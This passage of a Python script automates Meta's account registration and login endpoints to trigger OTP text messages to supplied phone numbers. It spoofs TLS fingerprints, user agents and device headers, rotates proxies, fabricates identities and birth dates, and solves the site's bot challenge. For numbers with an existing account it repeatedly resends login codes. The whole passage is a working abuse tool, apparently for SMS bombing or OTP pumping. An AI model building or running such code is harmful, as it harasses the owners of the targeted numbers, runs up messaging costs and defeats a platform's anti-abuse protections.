        "Benjamin", "Mia", "Elijah", "Charlotte", "Lucas", "Amelia", "Mason", "Harper", "Logan", "Evelyn",
        "David", "Sarah", "Michael", "Jessica", "Chris", "Ashley", "Matthew", "Emily", "Daniel", "Amanda",
        "Alexander", "Abigail", "Henry", "Ella", "Jackson", "Elizabeth", "Sebastian", "Camila", "Aiden", "Luna",
        "Joseph", "Sofia", "Samuel", "Avery", "Carter", "Mila", "Owen", "Aria", "Wyatt", "Scarlett",
        "Ethan", "Penelope", "Gabriel", "Layla", "Luke", "Chloe", "Isaac", "Victoria", "Anthony", "Madison",
        "Julian", "Eleanor", "Dylan", "Grace", "Levi", "Nora", "Christopher", "Riley", "Andrew", "Zoey",
        "Mateo", "Hannah", "Ryan", "Hazel", "Jaxon", "Lily", "Nathan", "Ellie", "Aaron", "Violet",
        "Charles", "Lillian", "Christian", "Zoe", "Thomas", "Stella", "Isaiah", "Aurora", "Caleb", "Natalie",
        "Josiah", "Emilia", "Jonathan", "Everly", "Hunter", "Leah", "Eli", "Aubrey", "Joshua", "Willow"
    ]
    return random.choice(first_names)

def generate_random_last_name():
    last_names = [
        "Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor",
        "Anderson", "Thomas", "Jackson", "White", "Harris", "Martin", "Thompson", "Garcia", "Martinez", "Robinson",
        "Clark", "Rodriguez", "Lewis", "Lee", "Walker", "Hall", "Allen", "Young", "Hernandez", "King",
        "Wright", "Lopez", "Hill", "Scott", "Green", "Adams", "Baker", "Gonzalez", "Nelson", "Carter",
        "Mitchell", "Perez", "Roberts", "Turner", "Phillips", "Campbell", "Parker", "Evans", "Edwards", "Collins",
        "Stewart", "Sanchez", "Morris", "Rogers", "Reed", "Cook", "Morgan", "Bell", "Murphy", "Bailey",
        "Rivera", "Cooper", "Richardson", "Cox", "Howard", "Ward", "Torres", "Peterson", "Gray", "Ramirez",
        "James", "Watson", "Brooks", "Kelly", "Sanders", "Price", "Bennett", "Wood", "Barnes", "Ross",
        "Henderson", "Coleman", "Jenkins", "Perry", "Powell", "Long", "Patterson", "Hughes", "Flores", "Washington",
        "Butler", "Simmons", "Foster", "Gonzales", "Bryant", "Alexander", "Russell", "Griffin", "Diaz", "Hayes"
    ]
    return random.choice(last_names)


def strip_json_prefix(text):
    """Remove Facebook's 'for (;;);' anti-hijacking prefix from JSON responses."""
    if text.startswith("for (;;);"):
        return text[len("for (;;);"):]
    return text


def build_common_params(hs, rev, s_val, hsi, dyn, csr, comet_req, lsd, jazoest, spin_b, spin_t,
                        ccg="GOOD", hsdp="gcRnf93M12AfEw3UDxadz88U0Km0BUbE07Je07w8", hblp="09uUmwf-q6Uhwr86u4EScwzw2GpodoowvE0gBwcK02tK03cW0dixa07w81G83bKewro1No0gCw3t83wwnU0De0avw", sjsp="gcRnf948a0"):
    """Build the common Facebook API form parameters."""
    return {
        '__user': '0',
        '__a': '1',
        '__hs': hs,
        'dpr': '1',
        '__ccg': ccg,
        '__rev': rev,
        '__s': s_val,
        '__hsi': hsi,
        '__dyn': dyn,
        '__csr': csr,
        '__hsdp': hsdp,
        '__hblp': hblp,
        '__sjsp': sjsp,
        '__comet_req': comet_req,
        'lsd': lsd,
        'jazoest': jazoest,
        '__spin_r': rev,
        '__spin_b': spin_b,
        '__spin_t': spin_t,
        '__jssesw': '1',
    }


import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def process_number(number, user_agent_data, proxy=None, resend_count=1):
    """Core API logic: navigate Meta AI registration flow to trigger OTP."""
    if isinstance(user_agent_data, tuple):
        user_agent, ua_name = user_agent_data
    else:
        user_agent = user_agent_data
        ua_name = "Unknown UA"
        
    number = str(number).strip()
    if not number.startswith('+'):
        number = '+' + number
    try:
        # Match TLS fingerprint with the User-Agent platform
        if "Android" in user_agent:
            impersonate_target = random.choice(['chrome99_android', 'chrome131_android'])
        elif "iPhone" in user_agent or "iPad" in user_agent:
            impersonate_target = random.choice(['safari172_ios', 'safari180_ios', 'safari184_ios', 'safari17_2_ios', 'safari18_0_ios', 'safari260_ios'])
        elif "Mac OS X" in user_agent and "Safari" in user_agent and "Chrome" not in user_agent:
            impersonate_target = random.choice(['safari155', 'safari170', 'safari180', 'safari184'])
        else:
            impersonate_target = random.choice(['chrome131', 'chrome142', 'chrome145', 'chrome146', 'chrome124'])

        session = requests.Session(impersonate=impersonate_target)
        session.verify = False
        
        # Get language and country code based on target number and proxy
        lang_header, country_code, _ = get_locale_for_proxy(proxy, number)
        
        actual_proxy_country = "Unknown"
        if isinstance(proxy, dict):
            if 'country' in proxy and proxy['country'] != "Unknown":
                actual_proxy_country = proxy['country']
            elif 'original' in proxy:
                match = re.search(r'[-_](?:region|country|zone)[-_]([a-zA-Z]{2})', proxy['original'])
                if match:
                    actual_proxy_country = match.group(1).upper()
        
        proxy_dict = None
        if proxy:
            if isinstance(proxy, dict) and 'proxy' in proxy:
                proxy_dict = proxy['proxy']
            elif isinstance(proxy, dict):
                proxy_dict = proxy
                
        if proxy_dict and isinstance(proxy_dict, dict):
            refreshed_dict = {}
            for proto in ['http', 'https']:
                if proto in proxy_dict and isinstance(proxy_dict[proto], str):
                    url = proxy_dict[proto]
                    if "session-s" in url:
                        url = re.sub(r'session-s\d+', f'session-s{random.randint(100000, 999999)}', url)
                    refreshed_dict[proto] = url
            if refreshed_dict:
                session.proxies.update(refreshed_dict)
                proxy_to_show = refreshed_dict.get('http', '')
            else:
                proxy_to_show = proxy_dict.get('http', '')
        else:
            proxy_to_show = "Direct"
            
        safe_print(f"{CYAN} [INFO] Proxy: {actual_proxy_country} [{number}]")

        # Generate fake identity and device for this run
        req_first_name = generate_random_first_name()
        req_last_name = generate_random_last_name()
        req_display_name = f"{req_first_name} {req_last_name}"
        req_device_id = str(uuid.uuid4())

        # We must explicitly set the User-Agent to match the one generated by setup_user_agent
        # Add Safari/Apple specific headers + x-fb device fingerprint headers
        
        # Generate random device fingerprint values for each request
        fb_boot_id = str(uuid.uuid4())
        fb_session_id = str(uuid.uuid4())
        fb_advertising_id = str(uuid.uuid4())
        fb_hwid = req_device_id  # reuse the device id
        fb_battery = random.randint(20, 98)
        fb_uptime = random.randint(10000, 300000)
        fb_foreground_time = random.randint(5000, 120000)
        fb_bandwidth = random.randint(20000000, 150000000)
        
        # Map country to locale code for x-fb-device-locale
        locale_map = {
            'IT': 'it_IT', 'US': 'en_US', 'GB': 'en_GB', 'DE': 'de_DE', 'FR': 'fr_FR',
            'ES': 'es_ES', 'BR': 'pt_BR', 'IL': 'he_IL', 'SA': 'ar_SA', 'TR': 'tr_TR',
            'NL': 'nl_NL', 'PL': 'pl_PL', 'RU': 'ru_RU', 'JP': 'ja_JP', 'KR': 'ko_KR',
            'IN': 'hi_IN', 'BD': 'bn_BD', 'PK': 'ur_PK', 'ID': 'id_ID', 'TH': 'th_TH',
            'VN': 'vi_VN', 'PH': 'en_PH', 'MY': 'ms_MY', 'SE': 'sv_SE', 'NO': 'no_NO',
            'DK': 'da_DK', 'FI': 'fi_FI', 'PT': 'pt_PT', 'GR': 'el_GR', 'CZ': 'cs_CZ',
            'AT': 'de_AT', 'CH': 'de_CH', 'BE': 'nl_BE', 'IE': 'en_IE', 'MX': 'es_MX',
            'AR': 'es_AR', 'CO': 'es_CO', 'CL': 'es_CL', 'PE': 'es_PE',
        }
        fb_locale = locale_map.get(country_code, 'en_US')
        
        # Random carrier names per country
        carrier_map = {
            'IT': ['WindTre', 'TIM', 'Vodafone IT', 'Iliad'],
            'US': ['T-Mobile', 'AT&T', 'Verizon'],
            'GB': ['EE', 'Three', 'Vodafone UK', 'O2'],
            'DE': ['Telekom', 'Vodafone DE', 'o2-de'],
            'FR': ['Orange', 'SFR', 'Bouygues', 'Free'],
            'IL': ['Cellcom', 'Partner', 'Pelephone', 'HOT Mobile'],
            'BR': ['Vivo', 'Claro', 'TIM BR', 'Oi'],
        }
        fb_carrier = random.choice(carrier_map.get(country_code, ['']))
        
        # Random device specs
        device_specs = [
            {'cpu': 'MediaTek Dimensity 8200', 'gpu': 'Mali-G610 MC6', 'model': 'CPH2505', 'soc': 'MediaTek', 'ram': '12', 'density': '2.75'},
            {'cpu': 'Qualcomm Snapdragon 8 Gen 2', 'gpu': 'Adreno 740', 'model': 'SM-S911B', 'soc': 'Qualcomm', 'ram': '8', 'density': '3.0'},
            {'cpu': 'Qualcomm Snapdragon 888', 'gpu': 'Adreno 660', 'model': 'SM-G991B', 'soc': 'Qualcomm', 'ram': '8', 'density': '2.625'},
            {'cpu': 'Apple A16 Bionic', 'gpu': 'Apple GPU', 'model': 'iPhone15,2', 'soc': 'Apple', 'ram': '6', 'density': '3.0'},
            {'cpu': 'Apple A17 Pro', 'gpu': 'Apple GPU', 'model': 'iPhone16,1', 'soc': 'Apple', 'ram': '8', 'density': '3.0'},
            {'cpu': 'Qualcomm Snapdragon 778G', 'gpu': 'Adreno 642L', 'model': 'SM-A536B', 'soc': 'Qualcomm', 'ram': '6', 'density': '2.0'},
            {'cpu': 'MediaTek Dimensity 9200', 'gpu': 'Immortalis-G715 MC11', 'model': 'V2227A', 'soc': 'MediaTek', 'ram': '12', 'density': '2.75'},
        ]
        dev = random.choice(device_specs)
        
        # Timezone offset based on country
        tz_map = {'IT': 3600, 'US': -18000, 'GB': 3600, 'DE': 3600, 'FR': 3600, 'IL': 10800, 'BR': -10800, 'TR': 10800, 'JP': 32400, 'KR': 32400, 'IN': 19800, 'BD': 21600}
        fb_tz_offset = tz_map.get(country_code, 0)
        
        # Determine Sec-CH-UA values and browser-specific behavior
        is_safari = ("iPhone" in user_agent or "iPad" in user_agent or 
                     ("Mac OS X" in user_agent and "Safari" in user_agent and "Chrome" not in user_agent))
        is_mobile = "iPhone" in user_agent or "iPad" in user_agent or "Android" in user_agent
        
        sec_ch_ua_model = ''
        sec_ch_ua_platform_version = ''
        sec_ch_ua_full_version_list = ''
        sec_ch_prefers_color_scheme = 'dark'
        
        # Default fallback versions
        chrome_v = '152'
        chrome_full_v = '152.0.7977.76'
        
        # Try to extract actual chrome version from UA if present
        chrome_match = re.search(r'Chrome/(\d+)\.(\d+\.\d+\.\d+)', user_agent)
        if chrome_match:
            chrome_v = chrome_match.group(1)
            chrome_full_v = f"{chrome_match.group(1)}.{chrome_match.group(2)}"
        
        if "Android" in user_agent:
            sec_ch_ua = f'"Chromium";v="{chrome_v}", "Not?A_Brand";v="24", "Google Chrome";v="{chrome_v}"'
            sec_ch_ua_full_version_list = f'"Chromium";v="{chrome_full_v}", "Not?A_Brand";v="24.0.0.0", "Google Chrome";v="{chrome_full_v}"'
            sec_ch_ua_mobile = '?1'
            sec_ch_ua_platform = '"Android"'
            sec_ch_ua_model = f'"{dev["model"]}"'
            match = re.search(r'Android (\d+)', user_agent)
            if match:
                sec_ch_ua_platform_version = f'"{match.group(1)}"'
            else:
                sec_ch_ua_platform_version = '"14"'
        elif "iPhone" in user_agent or "iPad" in user_agent:
            # Match debug.txt iOS headers exactly
            sec_ch_ua = f'"Chromium";v="{chrome_v}", "Not:A-Brand";v="99"'
            sec_ch_ua_mobile = '?1'
            sec_ch_ua_platform = '"iOS"'
        elif "Windows" in user_agent:
            sec_ch_ua = f'"Chromium";v="{chrome_v}", "Not?A_Brand";v="24", "Google Chrome";v="{chrome_v}"'
            sec_ch_ua_full_version_list = f'"Chromium";v="{chrome_full_v}", "Not?A_Brand";v="24.0.0.0", "Google Chrome";v="{chrome_full_v}"'
            sec_ch_ua_mobile = '?0'
            sec_ch_ua_platform = '"Windows"'
            sec_ch_ua_platform_version = '"10.0.0"'
        else:
            sec_ch_ua = f'"Chromium";v="{chrome_v}", "Not?A_Brand";v="24"'
            sec_ch_ua_mobile = '?0'
            sec_ch_ua_platform = '"Linux"'
            
        base_headers = {
            'accept-language': lang_header,
            'user-agent': user_agent,
            'accept-encoding': 'gzip, deflate, br, zstd',
        }
        
        # Meta's script sends sec-gpc for all devices including iOS
        base_headers['sec-gpc'] = '1'
        if sec_ch_ua:
            base_headers['sec-ch-ua'] = sec_ch_ua
        if sec_ch_ua_full_version_list:
            base_headers['sec-ch-ua-full-version-list'] = sec_ch_ua_full_version_list
        if sec_ch_ua_mobile:
            base_headers['sec-ch-ua-mobile'] = sec_ch_ua_mobile
        if sec_ch_ua_platform:
            base_headers['sec-ch-ua-platform'] = sec_ch_ua_platform
        if sec_ch_ua_platform_version:
            base_headers['sec-ch-ua-platform-version'] = sec_ch_ua_platform_version
        if sec_ch_ua_model:
            base_headers['sec-ch-ua-model'] = sec_ch_ua_model
        if sec_ch_prefers_color_scheme:
            base_headers['sec-ch-prefers-color-scheme'] = sec_ch_prefers_color_scheme
            
        api_headers = {
            **base_headers,
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://auth.meta.com',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-asbd-id': '359341',
        }
        # Safari doesn't send 'priority' header; Chrome does
        if not is_safari:
            api_headers['priority'] = 'u=1, i'

        # Accept header differs between Safari and Chrome
        if is_safari:
            page_accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        else:
            page_accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'

        page_headers = {
            **base_headers,
            'accept': page_accept,
            'referer': 'https://www.google.com/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        if not is_safari:
            page_headers['priority'] = 'u=0, i'

        # Step 1: Visit meta.ai (with retry)
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            try:
                response = session.get("https://www.meta.ai/", headers=page_headers, allow_redirects=True, timeout=15)
            except requests.exceptions.RequestException as req_err:
                err_str = str(req_err).lower()
                # Detect SOCKS5 auth failures early — no point retrying with same bad credentials
                if "socks5 authentication failed" in err_str or "socks5 auth" in err_str:
                    update_counter("error", number, f"Proxy Auth Failed (SOCKS5): {str(req_err)[:50]}", RED)
                    save_failed_number(number)
                    return
                if attempt == max_retries:
                    update_counter("error", number, f"meta.ai request failed: {req_err}", RED)
                    save_failed_number(number)
                    return "RETRY"
                time.sleep(2)
                continue

            if response.status_code == 403:
                # Handle Cloudflare-style challenge
                challenge_match = re.search(r"fetch\('(/__rd_verify_[^']+)'\s*,", response.text)
                if challenge_match:
                    challenge_url = f"https://www.meta.ai{challenge_match.group(1)}"
                    challenge_headers = {
                        **base_headers,
                        'accept': '*/*',
                        'origin': 'https://www.meta.ai',
                        'referer': 'https://www.meta.ai/',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                    }
                    if not is_safari:
                        challenge_headers['priority'] = 'u=1, i'
                    session.post(challenge_url, headers=challenge_headers, timeout=15)
                else:
                    safe_print(f"{YELLOW} Challenge URL Not Found! [{number}]")
                    return

                page_headers_retry = {
                    **base_headers,
                    'accept': page_accept,
                    'cache-control': 'max-age=0',
                    'referer': 'https://www.meta.ai/',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'upgrade-insecure-requests': '1',
                }
                if not is_safari:
                    page_headers_retry['priority'] = 'u=0, i'
                try:
                    response = session.get("https://www.meta.ai/", headers=page_headers_retry, allow_redirects=True, timeout=15)
                except:
                    pass

                if response.status_code == 200:
                    break
            elif response.status_code == 403:
                safe_print(f"{YELLOW} [RATE LIMIT] IP Blocked (403)! [{number}]")
                continue
            elif response.status_code == 200:
                break
            else:
                break

        if response.status_code != 200:
            update_counter("error", number, "meta.ai visit failed!", RED)
            save_failed_number(number)
            return

        safe_print(f"{GREEN} ✅ META AI SERVER LOADED [{number}]")

        # Extract tokens from homepage
        html = response.text
        tokens = extract_tokens(html, session_cookies=session.cookies)
        lsd = tokens['lsd']
        rev = tokens['rev']
        hsi = tokens['hsi']
        spin_b = tokens['spin_b']
        spin_t = tokens['spin_t']
        hs = tokens['hs']
        comet_req = tokens['comet_req']
        jazoest = tokens['jazoest']

        waterfall_id = str(uuid.uuid4())
        s_val = generate_s_val()
        qpl_id = "947263943"
        dyn = "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0raazo7u0zE2ZwrU6C2q0XU6O1FwlU5G3y0zo7u0jW0eowRzE"
        csr = ""

        # Step 2: Fetch OIDC redirect URI
        oidc_url = f"https://www.meta.ai/api/oidc/start?waterfall_id={waterfall_id}"
        try:
            response = session.get(oidc_url, headers=base_headers, allow_redirects=False, timeout=15)
            oidc_uri = response.headers.get("Location") or response.headers.get("location") or ""
        except Exception as e:
            oidc_uri = ""

        if not oidc_uri:
            snippet = response.text[:150].replace('\n', ' ').strip() if 'response' in locals() else "Request Exception"
            status_code = response.status_code if 'response' in locals() else "N/A"
            safe_print(f"{RED} [DEBUG] oidc_uri fetch failed. Code: {status_code}, Resp: {snippet} [{number}]")
            update_counter("error", number, "oidc_uri not found!", RED)
            save_failed_number(number)
            return

        # Step 3: Follow auth redirect
        step3_headers = {
            **base_headers,
            'accept': page_accept,
            'accept-language': lang_header,
            'referer': 'https://www.meta.ai/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        if not is_safari:
            step3_headers['priority'] = 'u=0, i'

        response = session.get(oidc_uri, headers=step3_headers, allow_redirects=True, timeout=15)

        if response.status_code != 200:
            update_counter("error", number, "auth redirect failed!", RED)
            save_failed_number(number)
            return

        auth_referer = response.url
        parsed_auth_url = urlparse(auth_referer)
        auth_params = parse_qs(parsed_auth_url.query)
        csi = auth_params.get('csi', [''])[0]
        auth_redirect_uri = auth_params.get('redirect_uri', [''])[0]

        # Extract auth page tokens
        auth_tokens = extract_tokens(response.text, session_cookies=session.cookies, default_comet_req="33")
        auth_lsd = auth_tokens['lsd']
        auth_rev = auth_tokens['rev']
        auth_hsi = auth_tokens['hsi']
        auth_spin_b = auth_tokens['spin_b']
        auth_spin_t = auth_tokens['spin_t']
        auth_hs = auth_tokens['hs']
        auth_comet_req = auth_tokens['comet_req']
        auth_jazoest = auth_tokens['jazoest']

        auth_dyn = auth_tokens.get('dyn', "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0raazo7u0zE2ZwrU6C2q0XU6O1FwlU5G3y0zo7u0jW0eowRzE")
        auth_csr = auth_tokens.get('csr', "gkeGqGmummSYICjPjsiF25AyWy8kAGWF38Kiiip4ypHKmim1irw6-w2Oo0J60tK0vslENa6xp1NxS5O2E0PS00mra0q-rc0uJ1id4w3480m9U1n808uoiglS1bw4do1a2z8do4i9oG22lx4yx91nw2MUf8eU5u")
        auth_hsdp = auth_tokens.get('hsdp', "gcRnf93M12AfEw3UDxadz88U0Km0BUbE07Je07w8")
        auth_hblp = auth_tokens.get('hblp', "09uUmwf-q6Uhwr86u4EScwzw2GpodoowvE0gBwcK02tK03cW0dixa07w81G83bKewro1No0gCw3t83wwnU0De0avw")
        auth_sjsp = auth_tokens.get('sjsp', "gcRnf948a0")
        auth_ccg = "GOOD"

        

        # Generate Date of Birth
        current_year = time.localtime().tm_year
        dob_year = random.randint(current_year - 35, current_year - 18)
        dob_month = random.randint(1, 12)
        dob_day = random.randint(1, 28)
        dob = f"{dob_year}-{dob_month:02d}-{dob_day:02d}"

        # Step 4: Check contact point availability

        s_val = generate_s_val()

        step4_headers = {
            **api_headers,
            'accept-language': lang_header,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd,
        }

        step4_data = {
            'account_reg_info[birthday]': dob,
            'account_reg_info[device_id]': '',
            'account_reg_info[first_name]': '',
            'account_reg_info[has_youth_consent]': 'false',
            'account_reg_info[is_bootstrap_flow]': 'false',
            'account_reg_info[last_name]': '',
            'account_reg_info[pc_rendering_data]': '',
            'account_reg_info[phone_number]': number,
            'account_reg_info[registration_flow_id]': '',
            'allow_unconfirmed_email': 'false',
            'check_for_pre_registration_restrictions': 'true',
            'check_mma_account': 'true',
            'contact_point': number,
            'contact_point_type': 'PHONE_NUMBER',
            'reg_integrity': '',
            'check_ntm_qe': 'true',
            'skip_xapp_checks': 'false',
            'caa_event_flow': '',
            'csi': csi,
            'event_client_time': f'{time.time():.3f}',
            'waterfall_id': waterfall_id,
            'source_app_id': '1522763855472543',
            'qpl_join_id': generate_qpl_join_id(),
            **build_common_params(auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                                  auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg,
                                  auth_hsdp, auth_hblp, auth_sjsp),
            '__req': '1a',
        }

        response = session.post('https://auth.meta.com/api/check-contact-point-availability/', headers=step4_headers, data=step4_data, timeout=15)

        step4_text = strip_json_prefix(response.text)

        reg_integrity = ""
        try:
            step4_json = json.loads(step4_text)
            if step4_json.get("error"):
                step4_err = step4_json.get("errorDescription") or step4_json.get("error", {}).get("message", "Unknown Step 4 Error")
                error_code = step4_json.get("error") if isinstance(step4_json.get("error"), int) else step4_json.get("error", {}).get("code", 0)
                safe_print(f"{YELLOW} Step 4 Error (Code: {error_code}): {step4_err} [{number}]{RESET}")
                
                # Check for "existing" account across multiple languages or specific error codes (like 3301, 1357004, etc.)
                err_lower = str(step4_err).lower()
                existing_keywords = [
                    "exist", "already", "קיים", "موجود", "уже", "существует", "ya está", "já está", 
                    "déjà", "bereits", "già", "zaten", "사용", "すでに", "tồn tại", "ada", "sudah", "mewujud", "esistente"
                ]
                is_existing = any(kw in err_lower for kw in existing_keywords) or error_code in [3301, 1357004, 3116, 1357001, 3571123]
                
                if is_existing:
                    safe_print(f"{CYAN} Existing Account Detected! Sending OTP via Login Flow... [{number}]{RESET}")
                    
                    # Send OTP to existing account via login-email-otp/send-nonce
                    s_val_nonce = generate_s_val()
                    nonce_headers = {
                        **api_headers,
                        'accept-language': lang_header,
                        'origin': 'https://auth.meta.com',
                        'referer': auth_referer,
                        'x-fb-lsd': auth_lsd,
                    }
                    
                    nonce_data = {
                        'contact_point': number,
                        'qpl_join_id': generate_qpl_join_id(),
                        'source_app_id': '1522763855472543',
                        'waterfall_id': waterfall_id,
                        'use_fb_cp_nonce': 'false',
                        'use_ig_cp_nonce': 'false',
                        **build_common_params(auth_hs, auth_rev, s_val_nonce, auth_hsi, auth_dyn, auth_csr,
                                              auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg,
                                              auth_hsdp, auth_hblp, auth_sjsp),
                    }
                    
                    try:
                        nonce_resp = session.post('https://auth.meta.com/api/login-email-otp/send-nonce/', headers=nonce_headers, data=nonce_data, timeout=15)
                        nonce_text = strip_json_prefix(nonce_resp.text)
                        nonce_json = json.loads(nonce_text)
                        
                        if nonce_json.get("payload", {}).get("success"):
                            update_counter("success", number, f"OTP Sent to Existing Account! [Country: {country_code}] [Proxy: {actual_proxy_country}]", GREEN)
                            save_success_number(number)
                            
                            # Resend OTP for existing accounts
                            if resend_count > 0:
                                for r_idx in range(resend_count):
                                    s_val_resend = generate_s_val()
                                    resend_nonce_data = {
                                        'contact_point': number,
                                        'qpl_join_id': generate_qpl_join_id(),
                                        'source_app_id': '1522763855472543',
                                        'waterfall_id': waterfall_id,
                                        'use_fb_cp_nonce': 'false',
                                        'use_ig_cp_nonce': 'false',
                                        **build_common_params(auth_hs, auth_rev, s_val_resend, auth_hsi, auth_dyn, auth_csr,
                                                              auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg,
                                                              auth_hsdp, auth_hblp, auth_sjsp),
                                    }
                                    try:
                                        resend_resp = session.post('https://auth.meta.com/api/login-email-otp/send-nonce/', headers=nonce_headers, data=resend_nonce_data, timeout=15)
                                        resend_text = strip_json_prefix(resend_resp.text)
                                        resend_json = json.loads(resend_text)
                                        if resend_json.get("payload", {}).get("success"):
                                            safe_print(f"{GREEN} OTP Resend {r_idx+1}/{resend_count} Successful! (Existing) [{number}]")
                                        else:
                                            safe_print(f"{YELLOW} OTP Resend {r_idx+1}/{resend_count} Failed (Existing) [{number}]")
                                    except Exception as e:
                                        safe_print(f"{YELLOW} Resend OTP {r_idx+1} Error (Existing): {e} [{number}]")
                                    
                                    if r_idx < resend_count - 1:
                                        delay = round(random.uniform(0.5, 1.2), 2)
                                        time.sleep(delay)
                        else:
                            error_msg = nonce_json.get("errorDescription", nonce_json.get("errorSummary", "Unknown error"))
                            update_counter("failed", number, f"Send-Nonce Failed (Existing): {error_msg}", YELLOW)
                            save_failed_number(number)
                    except Exception as e:
                        update_counter("error", number, f"Send-Nonce Error: {str(e)[:50]}", RED)
                        save_failed_number(number)
                    
                    return
                else:
                    update_counter("failed", number, f"Step 4 Error: {step4_err}", RED)
                    save_failed_number(number)
                    return
            step4_payload_main = step4_json.get("payload") or {}
            reg_integrity = step4_payload_main.get("regIntegrity", "")
        except json.JSONDecodeError:
            pass

        if not reg_integrity:
            ri_match = re.search(r'"regIntegrity"\s*:\s*"([^"]+)"', response.text)
            if ri_match:
                reg_integrity = ri_match.group(1)

        contact_point = ""
        try:
            step4_payload = step4_json.get("payload") or {}
            contact_point = step4_payload.get("contactPoint", "")
        except:
            pass
        if not contact_point:
            cp_match = re.search(r'"contactPoint"\s*:\s*"([^"]+)"', response.text)
            if cp_match:
                contact_point = cp_match.group(1)
        if not contact_point:
            contact_point = number if number.startswith('+') else '+' + number

        # Step 5: Submit date of birth

        s_val = generate_s_val()
        qpl_join_id = generate_qpl_join_id()

        step5_headers = {
            **api_headers,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd,
        }

        step5_data = {
            'caa_event_flow': 'ntm',
            'date_of_birth': dob,
            'first_name': '',
            'has_youth_consent': 'false',
            'isf': 'false',
            'last_name': '',
            'phone_number': contact_point,
            'qpl_join_id': qpl_join_id,
            'reg_integrity': reg_integrity,
            'source_app_id': '1522763855472543',
            **build_common_params(auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                                  auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg,
                                  auth_hsdp, auth_hblp, auth_sjsp),
            '__req': '1k',
        }

        response = session.post('https://auth.meta.com/api/check-date-of-birth/', headers=step5_headers, data=step5_data, timeout=15)

        step5_text = strip_json_prefix(response.text)
        try:
            step5_json = json.loads(step5_text)
            if step5_json.get("error"):
                error_obj = step5_json.get("error")
                error_msg = step5_json.get("errorDescription")
                if not error_msg:
                    if isinstance(error_obj, dict):
                        error_msg = error_obj.get("message") or error_obj.get("summary") or str(error_obj)
                    else:
                        error_msg = str(error_obj)
                
                error_msg_str = str(error_msg).lower()
                if "exist" in error_msg_str or "already" in error_msg_str:
                    status_text = f"Existing Account! Skipping..."
                    update_counter("noacc", number, status_text, YELLOW)
                    save_failed_number(number)
                else:
                    status_text = f"Failed at DOB: {error_msg}"
                    update_counter("failed", number, status_text, YELLOW)
                    save_failed_number(number)
                
                return
            payload = step5_json.get("payload")
            if payload:
                new_ri = payload.get("regIntegrity", "")
                if new_ri:
                    reg_integrity = new_ri
        except json.JSONDecodeError:
            pass

        # Step 6: Submit password
        password = generate_password()
        formatted_password = f"#PWD_BROWSER:0:{int(time.time())}:{password}"

        s_val = generate_s_val()
        qpl_join_id = generate_qpl_join_id()

        step6_headers = {
            **api_headers,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd,
        }

        step6_data = {
            'contact_point': contact_point,
            'date_of_birth': dob,
            'name': '',
            'password': formatted_password,
            'contact_pointless_account': 'false',
            'qpl_join_id': qpl_join_id,
            **build_common_params(auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                                  auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg,
                                  auth_hsdp, auth_hblp, auth_sjsp),
            '__req': '1i',
        }

        response = session.post('https://auth.meta.com/api/check-password/', headers=step6_headers, data=step6_data, timeout=15)

        step6_text = strip_json_prefix(response.text)
        try:
            step6_json = json.loads(step6_text)
            if step6_json.get("error"):
                error_msg = step6_json.get("errorDescription", "Unknown error")
                update_counter("failed", number, f"Password step failed! {error_msg}", RED)
                save_failed_number(number)
                return
            payload = step6_json.get("payload")
            if payload:
                new_ri = payload.get("regIntegrity", "")
                if new_ri:
                    reg_integrity = new_ri
        except json.JSONDecodeError:
            pass

        # Step 6.5: Suggest Username
        s_val_username = generate_s_val()
        suggest_data = {
            'linked_account_display_name': '',
            'linked_account_type': '',
            'linked_account_username': '',
            **build_common_params(auth_hs, auth_rev, s_val_username, auth_hsi, auth_dyn, auth_csr,
                                  auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg,
                                  auth_hsdp, auth_hblp, auth_sjsp),
            '__req': '1p',
        }
        username = generate_random_username() # fallback
        try:
            suggest_resp = session.post('https://auth.meta.com/api/kadabra/suggest_username/', headers=step6_headers, data=suggest_data, timeout=15)
            suggest_json = json.loads(strip_json_prefix(suggest_resp.text))
            suggested_user = suggest_json.get("payload", {}).get("username")
            if suggested_user:
                username = suggested_user
        except Exception:
            pass

        # Step 6.55: Check marketing opt-in eligibility
        s_val_marketing = generate_s_val()
